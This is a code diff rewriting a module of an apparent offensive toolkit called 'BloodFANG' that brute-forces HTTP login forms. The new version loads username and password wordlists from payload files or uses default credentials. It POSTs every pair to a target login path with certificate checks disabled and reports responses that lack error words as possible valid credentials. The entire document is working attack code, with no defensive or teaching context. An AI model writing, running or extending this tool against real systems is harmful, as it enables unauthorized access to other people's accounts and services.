@@ -1,29 +1,38 @@
-import requests
-from itertools import product
+# BloodFANG/core/fangbrute.py
+import requests, time
+from pathlib import Path
 
-def password_spray(url, username_list, password_list, login_path, logger=print):
-    """
-    Basic HTTP form brute force / password spray.
-    url: base url (e.g., http://target.com)
-    username_list: list of usernames to try
-    password_list: list of passwords to try
-    login_path: path to login form (e.g., /login)
-    logger: logging function to capture output
-    """
+PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"
+def _load_payloads(name, fallback):
+    f = PAYLOAD_DIR / name
+    try:
+        if f.exists():
+            lines=[l.strip() for l in f.read_text(encoding="utf-8").splitlines()
+                   if l.strip() and not l.startswith("#")]
+            if lines: return lines
+    except Exception: pass
+    return fallback
 
-    login_url = url.rstrip("/") + login_path
+USERS = _load_payloads("brute_usernames.txt", ["admin","user","test"])
+PASS  = _load_payloads("brute_passwords.txt", ["password","123456","admin123"])
 
-    headers = {"User-Agent": "BloodFANG-BruteForce"}
-    logger(f"[>] Starting password spray on {login_url}")
+def password_spray(base, users, pwds, path, emit, stop_event=None):
+    if not path.startswith("/"): path="/"+path
+    target = base.rstrip("/") + path
+    emit(f"[BRUTE] Target: {target}")
+    for u in users:
+        for p in pwds:
+            if stop_event and stop_event.is_set(): emit("[BRUTE] Stopped."); return
+            data={"username":u,"password":p}
+            try:
+                r=requests.post(target,data=data,timeout=8,verify=False,allow_redirects=True)
+                emit(f"[BRUTE] {r.status_code} {u}:{p}")
+                low=r.text.lower()
+                if all(k not in low for k in ("invalid","incorrect","error")):
+                    emit(f"[BRUTE] Possible success {u}:{p}")
+            except Exception as e: emit(f"[BRUTE] Error: {e}")
+            time.sleep(0.3)
+    emit("[BRUTE] Completed.")
 
-    for username, password in product(username_list, password_list):
-        data = {"username": username, "password": password}  # Adjust keys if needed
-        try:
-            r = requests.post(login_url, data=data, headers=headers, timeout=10)
-            # Naive success check: status code 200 and no "invalid" in response
-            if r.status_code == 200 and "invalid" not in r.text.lower():
-                logger(f"[!!] Possible valid creds found - {username}:{password}")
-            else:
-                logger(f"[-] Tried {username}:{password} - failed")
-        except Exception as e:
-            logger(f"[X] Error on {username}:{password} - {e}")
+def run(target,emit,stop_event=None):
+    b,p=(target.split('::',1)+[''])[:2]; password_spray(b,USERS,PASS,p,emit,stop_event)
